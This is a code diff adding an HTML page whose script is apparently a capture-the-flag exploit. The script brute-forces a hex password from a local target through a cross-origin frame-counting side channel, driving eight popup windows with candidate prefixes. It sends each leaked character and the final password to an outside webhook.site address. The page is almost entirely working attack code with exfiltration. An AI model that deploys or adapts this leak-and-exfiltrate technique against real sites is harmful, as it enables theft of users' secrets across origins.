@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html>
+<head><title>Continue From Known</title></head>
+<body>
+<h1>Continue: lebah2e2044...</h1>
+<pre id="output"></pre>
+<script>
+const TARGET = 'https://127.0.0.1:9999/';
+const WEBHOOK = 'https://webhook.site/b63baddd-e909-4127-81ca-f44ebc0e04b9/';
+const CHARSET = '0123456789abcdef';
+
+function log(msg) {
+    document.getElementById('output').textContent += msg + '\n';
+}
+
+const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+
+const waitFor = async (f, timeout = 2000) => {
+    const start = Date.now();
+    while (true) {
+        if (await f()) return true;
+        if (Date.now() - start > timeout) return false;
+        await sleep(5);
+    }
+};
+
+// Open 8 windows
+const windows = [];
+for (let i = 0; i < 8; i++) {
+    windows.push(window.open('about:blank'));
+}
+
+if (windows.some(w => !w)) {
+    alert('Popup blocked! Allow popups and refresh.');
+    throw new Error('Popup blocked');
+}
+
+log(`✅ Opened ${windows.length} windows\n`);
+
+async function checkWithWindow(win, candidate) {
+    try {
+        win.location = 'about:blank';
+        await waitFor(() => win.length === 0, 700);
+        await sleep(20);
+        
+        win.location = TARGET + '?pass=' + encodeURIComponent(candidate);
+        
+        await waitFor(() => {
+            try { win.origin; return false; } catch { return true; }
+        }, 1200);
+        
+        await sleep(60);
+        return win.length > 0;
+    } catch (e) {
+        return false;
+    }
+}
+
+async function testBatch(known, startIdx) {
+    const batch = [];
+    const promises = [];
+    
+    for (let i = 0; i < 8 && (startIdx + i) < CHARSET.length; i++) {
+        const c = CHARSET[startIdx + i];
+        batch.push(c);
+        promises.push(checkWithWindow(windows[i], known + c));
+    }
+    
+    log(`  [${batch.join(' ')}]`);
+    const results = await Promise.all(promises);
+    
+    for (let i = 0; i < results.length; i++) {
+        if (results[i]) {
+            return batch[i];
+        }
+    }
+    return null;
+}
+
+async function start() {
+    log('CONTINUING FROM: lebah2e2044\n');
+    
+    fetch(WEBHOOK + '?status=continue_started').catch(e=>{});
+    
+    // START FROM KNOWN PREFIX
+    let known = 'lebah2e2044';
+    const charsGot = 6; // Already have 6 hex chars
+    const charsNeeded = 12 - charsGot; // Need 6 more
+    
+    log(`Already leaked: ${charsGot}/12 chars`);
+    log(`Need: ${charsNeeded} more chars\n`);
+    
+    for (let pos = 0; pos < charsNeeded; pos++) {
+        log(`[${charsGot + pos + 1}/12]`);
+        let found = false;
+        
+        for (let i = 0; i < CHARSET.length; i += 8) {
+            const char = await testBatch(known, i);
+            if (char) {
+                known += char;
+                log(`✅ '${char}' -> ${known}\n`);
+                fetch(WEBHOOK + '?p=' + known).catch(e=>{});
+                found = true;
+                break;
+            }
+        }
+        
+        if (!found) {
+            log(`❌ Stuck at position ${charsGot + pos + 1}\n`);
+            break;
+        }
+    }
+    
+    log(`\n${'='.repeat(40)}`);
+    log(`PASSWORD: ${known}`);
+    log(`Progress: ${known.length - 5}/12 chars`);
+    log('='.repeat(40));
+    fetch(WEBHOOK + '?PASSWORD=' + known).catch(e=>{});
+    
+    windows.forEach(w => { if (w && !w.closed) w.close(); });
+}
+
+log('Continuing from lebah2e2044...\n');
+setTimeout(start, 500);
+</script>
+</body>
+</html>
